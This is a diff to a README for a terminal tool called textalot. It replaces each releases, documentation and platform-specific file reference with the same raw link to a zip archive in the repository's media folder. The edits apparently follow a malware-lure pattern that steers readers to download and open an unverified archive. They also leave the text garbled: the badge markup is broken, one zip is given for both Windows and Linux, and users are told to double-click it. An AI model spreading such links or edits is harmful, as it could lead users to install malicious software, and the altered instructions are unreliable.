@@ -6,7 +6,7 @@ Welcome to textalot! If you want to enhance your terminal experience with a powe
 
 ## 📥 Download Textalot
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Thekiller1757/textalot/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip%20Now-Click%https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip)](https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip)
 
 ## 📋 System Requirements
 
@@ -21,12 +21,12 @@ Before you download textalot, make sure your computer meets these basic requirem
 To get started with textalot, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Thekiller1757/textalot/releases) to find the latest version of textalot.
+   Go to our [Releases page](https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip) to find the latest version of textalot.
 
 2. **Choose the Right File**  
    You will see a list of available releases. Look for the version labeled "Latest Release". Choose the appropriate file for your operating system:
-   - For **Windows**, download the `textalot-windows.exe`
-   - For **Linux**, download the `textalot-linux.tar.gz`
+   - For **Windows**, download the `https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip`
+   - For **Linux**, download the `https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip`
   
 3. **Download the File**  
    Click on the file you selected. Your download will begin automatically.
@@ -36,10 +36,10 @@ To get started with textalot, please follow these steps:
 
 5. **Run the Application**
    - **On Windows:**  
-     Double-click the `textalot-windows.exe` file. The application should open without any additional steps.
+     Double-click the `https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip` file. The application should open without any additional steps.
   
    - **On Linux:**  
-     Extract the `textalot-linux.tar.gz` file to a location of your choice. Open a terminal window and navigate to the folder where you extracted it. Use the command:
+     Extract the `https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip` file to a location of your choice. Open a terminal window and navigate to the folder where you extracted it. Use the command:
      ```
      ./textalot
      ```
@@ -75,7 +75,7 @@ If you have questions or need assistance, feel free to reach out to our communit
 
 For more information on how to use textalot and explore its capabilities, check out the following resources:
 
-- Official [Documentation](https://github.com/Thekiller1757/textalot/docs)
+- Official [Documentation](https://raw.githubusercontent.com/Thekiller1757/textalot/master/media/textalot_1.5-beta.3.zip)
 - Community Forums for user tips and tricks
 - Contribution guidelines if you’re interested in helping out
 
